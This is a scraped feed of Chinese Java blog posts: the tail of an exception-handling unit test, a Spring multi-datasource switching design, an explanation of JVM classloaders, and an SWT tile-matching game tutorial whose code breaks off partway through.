                        allowing(beanFactory).getBean("action");
                        will(returnValue(action));
                        one(action).execute(request, response);
                        will(throwException(new BaseAppRuntimeException()));
                    }
                });
                broker.setExceptionHandler(new ConsoleHandler());
                broker.setBeanFactory(beanFactory);
                broker.execute("action", request, response);
            }
        }, BaseAppRuntimeException.class);
        // test config
        assertEquals(CoreContextFactory.getInstance().getExceptionContext()
                .getErrorCode(BaseAppRuntimeException.class), "LDD600-00001");
        // test handler
        assertFalse(response.isSuccess());
        assertEquals(response.getErrorCode(), CoreContextFactory.getInstance()
                .getExceptionContext().getErrorCode(
                        BaseAppRuntimeException.class));
        context.assertIsSatisfied();
    }
    public void testCheckedException() {
        final BusinessAction<Response, Request> action = context
                .mock(BusinessAction.class);
        final BeanFactory beanFactory = context.mock(BeanFactory.class);
        assertThrowing(new Closure() {
            public void run() throws Throwable {
                context.checking(new Expectations() {
                    {
                        allowing(beanFactory).getBean("action");
                        will(returnValue(action));
                        one(action).execute(request, response);
                        will(throwException(new ExceptionFaker()));
                    }
                });
                broker.setBeanFactory(beanFactory);
                broker.execute("action", request, response);
            }
        }, ExceptionFaker.class);
        // test config
        assertEquals(CoreContextFactory.getInstance().getExceptionContext()
                .getErrorCode(ExceptionFaker.class), "LDD600-00003");
        // test handler
        assertFalse(response.isSuccess());
        assertEquals(response.getErrorCode(), CoreContextFactory.getInstance()
                .getExceptionContext().getErrorCode(
                        ExceptionFaker.class));
        context.assertIsSatisfied();
    }
}
 参考资料：
文章1：http://www.onjava.com/pub/a/onjava/2006/01/11/exception-handling-framework-for-j2ee.html
文章2：http://sannotations.sourceforge.net/ 本文源代码：源代码下载
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
spring框架中多数据源创建加载并且实现动态切换的配置实例代码, lizhuangs.iteye.com.blog.2059925, Mon, 05 May 2014 09:33:39 +0800

原创不易，转载请注明出处：spring框架中多数据源创建加载并且实现动态切换的配置实例代码
代码下载地址：http://www.zuidaima.com/share/1774074130205696.htm
在我们的项目中遇到这样一个问题：我们的项目需要连接多个数据库，而且不同的客户在每次访问中根据需要会去访问不同的数据库。我们以往在spring和hibernate框架中总是配置一个数据源，因而sessionFactory的dataSource属性总是指向这个数据源并且恒定不变，所有DAO在使用sessionFactory的时候都是通过这个数据源访问数据库。但是现在，由于项目的需要，我们的DAO在访问sessionFactory的时候都不得不在多个数据源中不断切换，问题就出现了：如何让sessionFactory在执行数据持久化的时候，根据客户的需求能够动态切换不同的数据源？我们能不能在spring的框架下通过少量修改得到解决？是否有什么设计模式可以利用呢？ 
 
问题的分析
我首先想到在spring的applicationContext中配置所有的dataSource。这些dataSource可能是各种不同类型的，比如不同的数据库：Oracle、SQL Server、MySQL等，也可能是不同的数据源：比如apache 提供的org.apache.commons.dbcp.BasicDataSource、spring提供的org.springframework.jndi.JndiObjectFactoryBean等。然后sessionFactory根据客户的每次请求，将dataSource属性设置成不同的数据源，以到达切换数据源的目的。
 
但是，我很快发现一个问题：当多用户同时并发访问数据库的时候会出现资源争用的问题。这都是“单例模式”惹的祸。众所周知，我们在使用spring框架的时候，在beanFactory中注册的bean基本上都是采用单例模式，即spring在启动的时候，这些bean就装载到内存中，并且每个bean在整个项目中只存在一个对象。正因为只存在一个对象，对象的所有属性，更准确说是实例变量，表现得就如同是个静态变量（实际上“静态”与“单例”往往是非常相似的两个东西，我们常常用“静态”来实现“单例”）。拿我们的问题来说，sessionFactory在整个项目中只有一个对象，它的实例变量dataSource也就只有一个，就如同一个静态变量一般。如果不同的用户都不断地去修改dataSource的值，必然会出现多用户争用一个变量的问题，对系统产生隐患。
 
通过以上的分析，解决多数据源访问问题的关键，就集中在sessionFactory在执行数据持久化的时候，能够通过某段代码去根据客户的需要动态切换数据源，并解决资源争用的问题。
 
问题的解决
采用Decorator设计模式
要解决这个问题，我的思路锁定在了这个dataSource上了。如果sessionFactory指向的dataSource可以根据客户的需求去连接客户所需要的真正的数据源，即提供动态切换数据源的功能，那么问题就解决了。那么我们怎么做呢？去修改那些我们要使用的dataSource源码吗？这显然不是一个好的方案，我们希望我们的修改与原dataSource代码是分离的。根据以上的分析，使用GoF设计模式中的Decorator模式（装饰者模式）应当是我们可以选择的最佳方案。
 
什么是“Decorator模式”？简单点儿说就是当我们需要修改原有的功能，但我们又不愿直接去修改原有的代码时，设计一个Decorator套在原有代码外面。当我们使用Decorator的时候与原类完全一样，当Decorator的某些功能却已经修改为了我们需要修改的功能。Decorator模式的结构如图。
 
我们本来需要修改图中所有具体的Component类的一些功能，但却并不是去直接修改它们的代码，而是在它们的外面增加一个Decorator。Decorator与具体的Component类都是继承的AbstractComponent，因此它长得和具体的Component类一样，也就是说我们在使用Decorator的时候就如同在使用ConcreteComponentA或者ConcreteComponentB一样，甚至那些使用ConcreteComponentA或者ConcreteComponentB的客户程序都不知道它们用的类已经改为了Decorator，但是Decorator已经对具体的Component类的部分方法进行了修改，执行这些方法的结果已经不同了。
 
 
设计MultiDataSource类
现在回到我们的问题，我们需要对dataSource的功能进行变更，但又不希望修改dataSource中的任何代码。我这里指的dataSource是所有实现javax.sql.DataSource接口的类，我们常用的包括apache 提供的org.apache.commons.dbcp.BasicDataSource、spring提供的org.springframework.jndi.JndiObjectFactoryBean等，这些类我们不可能修改它们本身，更不可能对它们一个个地修改以实现动态分配数据源的功能，同时，我们又希望使用dataSource的sessionFactory根本就感觉不到这样的变化。Decorator模式就正是解决这个问题的设计模式。
 
首先写一个Decorator类，我取名叫MultiDataSource，通过它来动态切换数据源。同时在配置文件中将sessionFactory的dataSource属性由原来的某个具体的dataSource改为MultiDataSource。如图：
 
对比原Decorator模式，AbstractComponent是一个抽象类，但在这里我们可以将这个抽象类用接口来代替，即DataSource接口，而ConcreteComponent就是那些DataSource的实现类，如BasicDataSource、JndiObjectFactoryBean等。MultiDataSource封装了具体的dataSource，并实现了数据源动态切换：
java 代码
public class MultiDataSource implements DataSource {   
    private DataSource dataSource = null;   
public MultiDataSource(DataSource dataSource){   
        this.dataSource = dataSource;   
    }   
    /* (non-Javadoc)  
     * @see javax.sql.DataSource#getConnection()  
     */  
    public Connection getConnection() throws SQLException {   
        return getDataSource().getConnection();   
    }   
    //其它DataSource接口应当实现的方法   
  
    public DataSource getDataSource(){   
        return this.dataSource;   
        }   
    }   
    public void setDataSource(DataSource dataSource) {   
        this.dataSource = dataSource;   
    }   
}   
 
客户在发出请求的时候，将dataSourceName放到request中，然后把request中的数据源名通过调用newMultiDataSource(dataSource)时可以告诉MultiDataSource客户需要的数据源，就可以实现动态切换数据源了。但细心的朋友会发现这在单例的情况下就是问题的，因为MultiDataSource在系统中只有一个对象，它的实例变量dataSource也只有一个，就如同一个静态变量一般。正因为如此，单例模式让许多设计模式都不得不需要更改，这将在我的《“单例”更改了我们的设计模式》中详细讨论。那么，我们在单例模式下如何设计呢？
 
单例模式下的MultiDataSource
在单例模式下，由于我们在每次调用MultiDataSource的方法的时候，dataSource都可能是不同的，所以我们不能将dataSource放在实例变量dataSource中，最简单的方式就是在方法getDataSource()中增加参数，告诉MultiDataSource我到底调用的是哪个dataSource：
 
java 代码
public DataSource getDataSource(String dataSourceName){   
        log.debug("dataSourceName:"+dataSourceName);   
        try{   
            if(dataSourceName==null||dataSourceName.equals("")){   
                return this.dataSource;   
            }   
            return (DataSource)this.applicationContext.getBean(dataSourceName);   
        }catch(NoSuchBeanDefinitionException ex){   
            throw new DaoException("There is not the dataSource 
        }   
    }   
 
值得一提的是，我需要的数据源已经都在spring的配置文件中注册，dataSourceName就是其对应的id。
 
xml 代码
<bean id="dataSource1"  
    class="org.apache.commons.dbcp.BasicDataSource">  
    <property name="driverClassName">  
        <value>oracle.jdbc.driver.OracleDrivervalue>  
    property> 
    ......   
bean>  
<bean id="dataSource2"  
    class="org.apache.commons.dbcp.BasicDataSource">  
    <property name="driverClassName">  
        <value>oracle.jdbc.driver.OracleDrivervalue> 
    property>   
    ......   
bean>   
为了得到spring的ApplicationContext，MultiDataSource类必须实现接口org.springframework.context.ApplicationContextAware，并且实现方法：
java 代码
private ApplicationContext applicationContext = null;   
public void setApplicationContext(ApplicationContext applicationContext) throws BeansException {   
        this.applicationContext = applicationContext;   
    }  
 
 
如此这样，我就可以通过this.applicationContext.getBean(dataSourceName)得到dataSource了。
 
通过线程传递dataSourceName
查看以上设计，MultiDataSource依然无法运行，因为用户在发出请求时，他需要连接什么数据库，其数据源名是放在request中的，要将request中的数据源名传给MultiDataSource，需要经过BUS和DAO，也就是说为了把数据源名传给MultiDataSource，BUS和DAO的所有方法都要增加dataSourceName的参数，这是我们不愿看到的。写一个类，通过线程的方式跳过BUS和DAO直接传递给MultiDataSource是一个不错的设计：
 
java 代码
public class SpObserver {   
    private static ThreadLocal local = new ThreadLocal();   
    public static void putSp(String sp) {   
        local.set(sp);   
    }   
    public static String getSp() {   
        return (String)local.get();   
    }   
}   
 
做一个filter，每次客户发出请求的时候就调用SpObserver.petSp(dataSourceName)，将request中的dataSourceName传递给SpObserver对象。最后修改MultiDataSource的方法getDataSource()：
 
java 代码
public DataSource getDataSource(){   
        String sp = SpObserver.getSp();   
        return getDataSource(sp);   
    }   
 
完整的MultiDataSource代码在附件中。
 
动态添加数据源
通过以上方案，我们解决了动态分配数据源的问题，但你可能提出疑问：方案中的数据源都是配置在spring的ApplicationContext中，如果我在程序运行过程中动态添加数据源怎么办？这确实是一个问题，而且在我们的项目中也确实遇到。spring的ApplicationContext是在项目启动的时候加载的。加载以后，我们如何动态地加载新的bean到ApplicationContext中呢？我想到如果用spring自己的方法解决这个问题就好了。所幸的是，在查看spring的源代码后，我找到了这样的代码，编写了DynamicLoadBean类，只要调用loadBean()方法，就可以将某个或某几个配置文件中的bean加载到ApplicationContext中（见附件）。不通过配置文件直接加载对象，在spring的源码中也有，感兴趣的朋友可以自己研究。
 
 
在spring中配置
在完成了所有这些设计以后，我最后再唠叨一句。我们应当在spring中做如下配置：
 
xml 代码
<bean id="dynamicLoadBean" class="com.htxx.service.dao.DynamicLoadBean">bean>  
<bean id="dataSource" class="com.htxx.service.dao.MultiDataSource">  
        <property name="dataSource">  
            <ref bean="dataSource1" />  
        property>  
    bean>  
    <bean id="sessionFactory" class="org.springframework.orm.hibernate3.LocalSessionFactoryBean">  
        <property name="dataSource">  
            <ref bean="dataSource" />  
        property>  
        ......   
    bean>  
 
其中dataSource属性实际上更准确地说应当是defaultDataSource，即spring启动时以及在客户没有指定数据源时应当指定的默认数据源。
该方案的优势
以上方案与其它方案相比，它有哪些优势呢？
 
首先，这个方案完全是在spring的框架下解决的，数据源依然配置在spring的配置文件中，sessionFactory依然去配置它的dataSource属性，它甚至都不知道dataSource的改变。唯一不同的是在真正的dataSource与sessionFactory之间增加了一个MultiDataSource。
 
其次，实现简单，易于维护。这个方案虽然我说了这么多东西，其实都是分析，真正需要我们写的代码就只有MultiDataSource、SpObserver两个类。MultiDataSource类真正要写的只有getDataSource()和getDataSource(sp)两个方法，而SpObserver类更简单了。实现越简单，出错的可能就越小，维护性就越高。
 
最后，这个方案可以使单数据源与多数据源兼容。这个方案完全不影响BUS和DAO的编写。如果我们的项目在开始之初是单数据源的情况下开发，随着项目的进行，需要变更为多数据源，则只需要修改spring配置，并少量修改MVC层以便在请求中写入需要的数据源名，变更就完成了。如果我们的项目希望改回单数据源，则只需要简单修改配置文件。这样，为我们的项目将增加更多的弹性。
特别说明：实例中的DynamicLoadBean在web环境下运行会出错，需要将类中AbstractApplicationContext改为org.springframework.context.ConfigurableApplicationContext。
 
代码下载地址：http://dl.iteye.com/topics/download/11b45eb4-9732-4fcb-85de-dd88238958b2
相关博客：再析在spring框架中解决多数据源的问题
已有 3 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
java classLoader体系结构使用详解, lizhuangs.iteye.com.blog.2059505, Sun, 04 May 2014 09:36:45 +0800

原创整理不易，转载请注明出处：java classLoader体系结构使用详解
代码下载地址：http://www.zuidaima.com/share/1774052029516800.htm
jvm classLoader architecture：
Bootstrap ClassLoader/启动类加载器  主要负责jdk_home/lib目录下的核心 api 或 -Xbootclasspath 选项指定的jar包装入工作。
Extension ClassLoader/扩展类加载器  主要负责jdk_home/lib/ext目录下的jar包或 -Djava.ext.dirs 指定目录下的jar包装入工作。
System ClassLoader/系统类加载器  主要负责java -classpath/-Djava.class.path所指的目录下的类与jar包装入工作。
User Custom ClassLoader/用户自定义类加载器(java.lang.ClassLoader的子类)  在程序运行期间, 通过java.lang.ClassLoader的子类动态加载class文件, 体现java动态实时类装入特性。
类加载器的特性：
每个ClassLoader都维护了一份自己的名称空间， 同一个名称空间里不能出现两个同名的类。
为了实现java安全沙箱模型顶层的类加载器安全机制, java默认采用了 " 双亲委派的加载链 " 结构。
 
类图中， BootstrapClassLoader是一个单独的java类， 其实在这里， 不应该叫他是一个java类。因为，它已经完全不用java实现了。它是在jvm启动时， 就被构造起来的， 负责java平台核心库。
自定义类加载器加载一个类的步骤
classloader-load-class
ClassLoader 类加载逻辑分析， 以下逻辑是除 BootstrapClassLoader 外的类加载器加载流程：
// 检查类是否已被装载过  
Class c = findLoadedClass(name);  
if (c == null ) {  
     // 指定类未被装载过  
     try {  
         if (parent != null ) {  
             // 如果父类加载器不为空， 则委派给父类加载  
             c = parent.loadClass(name, false );  
         } else {  
             // 如果父类加载器为空， 则委派给启动类加载加载  
             c = findBootstrapClass0(name);  
         }  
     } catch (ClassNotFoundException e) {  
         // 启动类加载器或父类加载器抛出异常后， 当前类加载器将其  
         // 捕获， 并通过findClass方法， 由自身加载  
         c = findClass(name);  
     }  
}  
线程上下文类加载器 java默认的线程上下文类加载器是 系统类加载器(AppClassLoader)。
// Now create the class loader to use to launch the application  
try {  
    loader = AppClassLoader.getAppClassLoader(extcl);  
} catch (IOException e) {  
    throw new InternalError(  
"Could not create application class loader" );  
}   
  
// Also set the context class loader for the primordial thread.  
Thread.currentThread().setContextClassLoader(loader);  
以上代码摘自sun.misc.Launch的无参构造函数Launch()。
使用线程上下文类加载器, 可以在执行线程中, 抛弃双亲委派加载链模式, 使用线程上下文里的类加载器加载类. 典型的例子有, 通过线程上下文来加载第三方库jndi实现, 而不依赖于双亲委派. 大部分java app服务器(jboss, tomcat..)也是采用contextClassLoader来处理web服务。 还有一些采用 hotswap 特性的框架, 也使用了线程上下文类加载器, 比如 seasar (full stack framework in japenese).
线程上下文从根本解决了一般应用不能违背双亲委派模式的问题. 使java类加载体系显得更灵活.
随着多核时代的来临, 相信多线程开发将会越来越多地进入程序员的实际编码过程中. 因此, 在编写基础设施时， 通过使用线程上下文来加载类, 应该是一个很好的选择。
当然, 好东西都有利弊. 使用线程上下文加载类, 也要注意, 保证多根需要通信的线程间的类加载器应该是同一个, 防止因为不同的类加载器, 导致类型转换异常(ClassCastException)。
为什么要使用这种双亲委托模式呢？
因为这样可以避免重复加载，当父亲已经加载了该类的时候，就没有必要子ClassLoader再加载一次。
考虑到安全因素，我们试想一下，如果不使用这种委托模式，那我们就可以随时使用自定义的String来动态替代java核心api中定义类型，这样会存在非常大的安全隐患，而双亲委托的方式，就可以避免这种情况，因为String已经在启动时被加载，所以用户自定义类是无法加载一个自定义的ClassLoader。
java动态载入class的两种方式：
implicit隐式,即利用实例化才载入的特性来动态载入class
explicit显式方式,又分两种方式:
java.lang.Class的forName()方法
java.lang.ClassLoader的loadClass()方法
用Class.forName加载类
Class.forName使用的是被调用者的类加载器来加载类的。 这种特性, 证明了java类加载器中的名称空间是唯一的, 不会相互干扰。 即在一般情况下, 保证同一个类中所关联的其他类都是由当前类的类加载器所加载的。
public static Class forName(String className)  
     throws ClassNotFoundException {  
     return forName0(className, true , ClassLoader.getCallerClassLoader());  
}   
  
/** Called after security checks have been made. */  
private static native Class forName0(String name, boolean initialize,  
ClassLoader loader)  
     throws ClassNotFoundException;  
上面中 ClassLoader.getCallerClassLoader 就是得到调用当前forName方法的类的类加载器
static块在什么时候执行?
当调用forName(String)载入class时执行,如果调用ClassLoader.loadClass并不会执行.forName(String,false,ClassLoader)时也不会执行.
如果载入Class时没有执行static块则在第一次实例化时执行.比如new ,Class.newInstance()操作
static块仅执行一次
各个java类由哪些classLoader加载?
java类可以通过实例.getClass.getClassLoader()得知
接口由AppClassLoader(System ClassLoader,可以由ClassLoader.getSystemClassLoader()获得实例)载入
ClassLoader类由bootstrap loader载入
NoClassDefFoundError和ClassNotFoundException
NoClassDefFoundError:当java源文件已编译成.class文件,但是ClassLoader在运行期间在其搜寻路径load某个类时,没有找到.class文件则报这个错
ClassNotFoundException:试图通过一个String变量来创建一个Class类时不成功则抛出这个异常
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Eclipse SWT开发教程以及一个连连看游戏的代码实现下载, lizhuangs.iteye.com.blog.2059317, Sat, 03 May 2014 10:40:27 +0800

原创整理不易，转载请标明出处：Eclipse SWT开发教程以及一个连连看游戏的代码实现下载
代码下载地址：http://www.zuidaima.com/share/1772672482675712.htm
　　我在前面讲过：如果讲GUI编程一味只讲各个控件的使用方法，那么纯粹是浪费大家时间，如果出书，那绝对是骗钱的。所以我并不会详细地讲解SWT各个控件的具体使用方法。然而的众所周知，Eclipse的UI界面是建立在SWT基础之上的，如果一字不提SWT，似乎也不大可能。SWT是一个优秀的GUI编程框架，即使不要Eclipse的其它部分，SWT也可以单独使用。单独使用SWT编写GUI程序的最简单示例如下：
 public static void main (String [] args) {
      Display display = new Display ();
      Shell shell = new Shell (display);
      Label label = new Label (shell, SWT.CENTER);
      label.setText ("Hello_world");
      label.setBounds (shell.getClientArea ());
      shell.open ();
      while (!shell.isDisposed ()) {
         if (!display.readAndDispatch ()) display.sleep ();
      }
      display.dispose ();
   }
 　　从上面的代码可以看出，使用SWT比使用其它GUI框架要多出一步，那就是先要创建一个Display。SWT与其它GUI框架的另外一个不同之处就是它的主窗口不叫窗口，而是叫Shell。除此之外，如果大家具有其它GUI框架的编程基础，使用SWT就没什么难度了。 　　我在这里简单比较一下SWT和Swing的区别。在使用Swing时，一般会创建一个JFrame作为主窗口，然后向里面添加控件，而且不需要Display。Swing添加控件的时候是parent.add(child)。SWT需要先创建一个Display，然后再创建一个Shell作为主窗口，然后再添加控件。SWT添加控件的方法是把parent作为参数传递到child的构造函数中。SWT的主窗口关闭后，还得dispose掉Display。而它们对于事件的处理基本上是一样的，都是通过control.addXXXListener添加一个事件处理器来进行。 　　SWT为什么要这么一个额外的Display呢？而这个Display又代表着什么呢？SWT底层究竟有着什么样的设计哲学呢？ 　　Eclipse自己的文档说Display是SWT和操作系统本地GUI之间的桥梁，Display的主要用途就是建立一个消息循环并进行消息的派发，另外一个用途就是帮助GUI线程和非GUI线程进行通讯。我认为，Display还有一个理解，那就是Display是计算机显示系统的一个抽象。看一下下面这个Drawable接口的继承关系： 　　可以看到，Display实现了Drawable接口，说明我们可以随意在Display上进行绘图。另外，Display还是Device的子类，说明Display代表着一种设备，而另外一个同样也属于设备的是Printer。我们可以这样理解：如果要把图像显示在电脑屏幕上，就可以使用Display进行画图，如果要把什么内容打印到纸上，使用Printer就好，如果有其它的另类的显示设备，就只好自己实现Device了。 　　SWT的widgets中包含很多Control，具体用法我就不讲了，大家可以自己参考SWT的文档，或者直接上SWT Designer或WindowBuilder pro。通过Control的addXXXListener方法可以为该控件添加事件处理器，从而处理响应的事件。下面的截图可以看到Control可以添加的一系列事件处理器： 　　除了一般的鼠标键盘事件，每一个实现了Drawable接口的控件都可以随意进行绘制，只需要使用addPaintListener来添加一个PaintListener即可。绘图离不开下面这些东西： 　　按我自己的理解，我一般将GUI程序分成三类。 　　第一类就是一个对话框里面有许多文本框和按钮的那种，用户依次将各个文本框填满，点击一个按钮，然后就等着程序处理这些数据了。这种类型的GUI系统非常的简单，它的重点并不是GUI，而是GUI背后的业务逻辑。比如超市、银行用的终端，即使是使用全由字符界面组成的只显示黑白灰色的GUI系统，依然能够处理复杂的业务。还有现在和很多ERP系统、HIS系统等等，无非就是数据的采集、存储、显示，用几个文本框和按钮控件足以，没有什么技术含量。 　　第二类是涉及到自己绘图的那种，比如绘制个什么波形图啊，绘制个什么2D游戏啊。这种类型的GUI程序不需要复杂的控件，重点在于绘图的操作。比如我后面即将展示的连连看游戏，就仅仅使用了一个Canvas而已。当然，要写个像Photoshop之类的巨型软件，难度还是很大的。 　　第三类就是可以用来处理文档的那种。比如各种字处理程序、表格程序、浏览器程序，还有我们程序员最常用的IDE。在这些处理程序中，什么字体变大变小、颜色变红变白什么的，说到底还是画图，和第二类的画图差不多，但是其背后掩藏着复杂的算法。就拿我们常见的IDE来说，语法高亮、自动提示这样的功能怎么也离不开对文本内容的解析，还要计算每一个字符究竟显示在什么位置。要做得漂亮，难度也是很大的。 　　如果以上三类GUI程序都能熟练编写，就可以算是GUI编程的达人了。今天，我先展示一个连连看游戏的例子。直到目前为止，我所讲述的Eclipse RCP都还只是建立在视图上。怎么写编辑器（Editor）还没有涉及。以后肯定会讲到编辑器的编写，当然是可以分析文本的编辑器，对于那种只靠文本框和按钮收集和编辑数据的，我觉得不好意思叫编辑器。今天的连连看程序仍然是一个单视图的程序。 　　连连看游戏运行效果图： 　　如果碰到困难，点击工具栏的放大镜图标，可以自动推荐两个可以匹配的方块，如下图： 　　下面来谈谈这个程序的实现。首先是准备素材。大家可以看到这个游戏中用到的图片都是Java世界一些比较著名的开源项目，如Spring、Tomcat、Glassfish、MySQL等。我从网上找到它们的Logo，然后用GIMP稍微处理了一下，就成了游戏中需要用到的方块。从上面两个截图可以看到，每一个方块都有三个状态，分别是正常状态、被选择状态和被推荐状态，所以每张图片有三个样式，如下图：程序的GUI结构： 　　程序的GUI结构非常简单，就是一个单视图的Eclipse RCP程序。这个视图的标题是Game View。和前两篇博文讲的不一样的地方是这个程序没有用菜单，而是使用了视图的工具栏。使用视图的工具栏和使用菜单的流程是一样的：1、先添加一个org.eclipse.ui.commands扩展，定义两个Command；2、再添加一个org.eclipse.ui.menus扩展，定义一个MenuContribution，该MenuContribution可以控制我们添加的Command显示在菜单中还是显示在工具栏中；3、写两个Handler，分别处理两个Command命令即可。 　　对MenuContribution设置不同的locationURI属性可以控制Command的显示位置。在前面一篇博文中，我们设置locationURI为menu:org.eclipse.ui.main.menu，所以就在主菜单中添加了一个菜单。在这个连连看游戏中，我将locationURI设置为toolbar:JavaLinkGame.views.game，也就是冒号前是toolbar，冒号后是Game View的Id，所以在Game View中添加了一个工具栏和两个按钮。 　　在Game View中只使用了一个Canvas控件，Canvas控件用来画图和响应用户的操作。所以只需要设置Canvas的PaintListener和MouseListener即可。程序的框架非常简单，如下图： 　　上面图片中显示的代码只是为了显示程序的结构，后面都经过了大量的更改和扩充。在上面的代码中，我在注释中问了两个一样的问题：这里用什么？如果是C或C++，就可以在这里传递一个函数指针，如果是函数式编程语言，就可以在这里直接传递一个函数。但是，我们用的是Java，所以canvas.addPaintListener()的参数只能是一个对象。要获得一个对象，就必须定义一个类，这正是Java语言的麻烦之处。 　　好在这个麻烦有许多的解决办法。如果不想另外写一个.java文件，我们可以定义一个内部类；如果连类名都懒得想，可以用一个匿名类；如果真的不想定义一个类，那就用lambda表达式吧。在这里我使用的是匿名类。如下图：　　 　　使用Java语言，除了时时刻刻要考虑定义一个类的问题外，还有一个问题，那就是field的可见性。一个类要如何才能访问到另一个类中的field？如上图，我们定义的匿名类中可以直接访问外面类中的canvas和spirits，也就是说内部类可以直接访问外部类中的field。是不是相当于闭包？假如我们不是用的匿名类，也不是用的内部类，而是另外定义一个类，那该如何访问到这里的canvas和spirits呢？只能通过构造函数把这两个field当参数传进去吧。程序的数据组织： 　　在这个程序中，除了Eclipse RCP必须的一个View和两个Handler类之外，我只额外写了两个类，一个类是Spirit，用它表示游戏中的一个方块。每一个Spirit对象保存了它需要的三幅图片、状态（是正常还是被选择还是被推荐）、坐标（在数组中的坐标，而不是像素的坐标）以及一个imageId，使用imageId的目的是为了方便判断用户选择的两个方块是否是相同的，相同的方块如果在转两个弯之内连得上的话就可以消去。另外一个类是GameAlgorithmUtil，它主要处理游戏中的算法。 　　我用了一个Spirit[][]二维数组来保存方块，这个二维数组的边缘一圈填充的Spirit的imageId为0，中间的Spirit的imageId不为0。imageId为0的Spirit不会显示，所以边缘这一圈显示为空白，也是最开始时候连接方块的通道。如下图： 　　另外，当两个方块可以消去时，我们还要显示他们之间的连线，所以需要保存他们之间连接的路径。这个简单，不需要另外写一个类，用一个LinkedList<Spirit>即可。游戏中的算法： 　　游戏中涉及的算法不多，只有两个。 第一个，是游戏开始时，需要把所有方块的位置打乱，所以需要一个洗牌算法。第二个，在用户选择了两个图片相同的方块时，需要判断它们是否可以连通，所以需要一个寻找路径的算法。 　　洗牌算法：先在这n个方块中随机选择一个方块和第n个方块交换，再在前n-1个方块中随机选择一个和第n-1个交换，再在前n-2个方块中随机选择一个和第n-2个交换……一直递归到第一个。 　　寻找路径算法：我没有用《编程之美》中讲到的广度优先搜素算法，而是用了另外一个分类扫描算法。将两个方块可以连通的情况分为三类。第1类，两个方块可以通过一条直线连通，没有转角；第2类，两个方块需要通过两条直线连通，有一个转角，第2中情况可以递归为判断这个转角处的元素可以和这两个方块分别通过一条直线连通；第3类，两个方块需要通过三条直线连通，有两个转角，很显然其中一个转角肯定要么和第一个方块同行，要么同列，然后递归为判断这个转角是否能够和第二个方块通过两条直线连接。 下面开始贴代码： 1、Spirit类的代码：
package com.xkland.examples.rcp.javalinkgame;
import org.eclipse.swt.graphics.GC;
import org.eclipse.swt.graphics.Image;
import org.eclipse.swt.widgets.Canvas;
public class Spirit {
    public static final int NORMAL = 0;
    public static final int SELECTED = 1;
    public static final int RECOMMENDED = 2;
    
    public int i;
    public int j;    
    public int imageId;
    
    private int state;
    private Image[] images = new Image[3];
    
    public Spirit(Image normal, Image selected, Image recommended,
            int imageId,int i, int j) {
        this.images[0] = normal;
        this.images[1] = selected;
        this.images[2] = recommended;
        this.imageId = imageId;
        this.i = i;
        this.j = j;
    }
    public void draw(Canvas canvas) {
        GC gc = new GC(canvas);
        if(images[state]!=null && imageId != 0)gc.drawImage(images[state], j*80, i*80);
    }
    
    public void changeState(){
        if(state == NORMAL || state == RECOMMENDED){
            state = SELECTED;
        }else{
            state = NORMAL;
        }
    }
    
    public void recommend(){
        state = RECOMMENDED;
    }
    
    public void setPosition(int i, int j){
        this.i = i;
        this.j = j;
    }
}
 2、视图类的代码：
package com.xkland.examples.rcp.javalinkgame;
import java.util.LinkedList;
import java.util.List;
import org.eclipse.swt.SWT;
import org.eclipse.swt.events.MouseEvent;
import org.eclipse.swt.events.MouseListener;
import org.eclipse.swt.events.PaintEvent;
import org.eclipse.swt.events.PaintListener;
import org.eclipse.swt.graphics.Color;
import org.eclipse.swt.graphics.GC;
import org.eclipse.swt.widgets.Canvas;
import org.eclipse.swt.widgets.Composite;
import org.eclipse.ui.part.ViewPart;
public class GameView extends ViewPart {
    
    private Canvas canvas;
    private final int M = GameAlgorithmUtil.M;
    private final int N = GameAlgorithmUtil.N;
    private Spirit[][] spirits = new Spirit[M][N];
    private List<Spirit> linkPath = new LinkedList<Spirit>();
    @Override
    public void createPartControl(Composite parent) {
        parent.setLayout(null);
        canvas = new Canvas(parent, SWT.NONE);
        canvas.setBounds(0,0,1120,720);
        
        canvas.addPaintListener(new PaintListener(){
            @Override
            public void paintControl(PaintEvent e) {
                //显示已选择的两个Spirit之间的链接路径
                if(!linkPath.isEmpty() && linkPath.size() <= 4){
                    for(int i=1; i<linkPath.size(); i++){
                        Color color = new Color(null, 240, 119, 70);
                        GC gc = new GC(canvas);
                        gc.setForeground(color);
                        gc.setLineWidth(2);
                        gc.drawLine(linkPath.get(i-1).j*80+36, linkPath.get(i-1).i*80+36, 
                                linkPath.get(i).j*80+36, linkPath.get(i).i*80+36);
                    }
                }
                //显示数组中的Spirit
                for(int i=0; i<M; i++){
                    for(int j=0; j<N; j++){
                        if(spirits[i][j] !=null ){
                            spirits[i][j].draw(canvas);
                        }
                    }
                }
            }            
        });
        
        canvas.addMouseListener(new MouseListener(){
            //下面两个field保存当前选中的Spirit和上一次点击选中的Spirit
            private Spirit oldSelect;
            private Spirit curSelect;
            //下面两个field保存已经匹配过了但是还没有消除的两个Spirit
            private Spirit matchedSpirit1;
            private Spirit matchedSpirit2;
            @Override
            public void mouseDown(MouseEvent e){
                //只要用户点击鼠标，就把之前已经匹配好的Spirit和它们之间的LinkPath消掉
                if(matchedSpirit1 != null && matchedSpirit2 != null && !linkPath.isEmpty()){
                    matchedSpirit1.imageId = 0;
                    matchedSpirit2.imageId = 0;
                    linkPath.clear();
                }
                
                //获取当前选择的Spirit
                for(int i=0; i<M; i++){
                    for(int j=0; j<N; j++){
                        if((i*80 + 4) < e.y && (i*80 + 68) > e.y && (j*80+4) < e.x && (j*80+68) > e.x){
                            if(curSelect != null){
                                oldSelect = curSelect;
                                curSelect = null;
                            }
                            curSelect = spirits[i][j];
                            if(curSelect.imageId !=0 )curSelect.changeState();
                            //如果选择的两个Spirit中的图片是一样的，则寻找它们之间的路径
                            if(oldSelect != null  && curSelect != null && oldSelect != curSelect
                                    && oldSelect.imageId == curSelect.imageId
                                    && curSelect.imageId != 0){
                                if(!GameAlgorithmUtil.findPath(spirits, curSelect, oldSelect, linkPath)){
                                    oldSelect.changeState();
                                }else{
                                    //如果找得到路径，就把它们保存起来，下一次点击鼠标时消掉
                                    matchedSpirit1 = oldSelect;
                                    matchedSpirit2 = curSelect;
                                    oldSelect = null;
                                    curSelect = null;                                    
                                }
                            }else{
                                if(oldSelect !=null)oldSelect.changeState();
                            }
                        }
                    }
                }
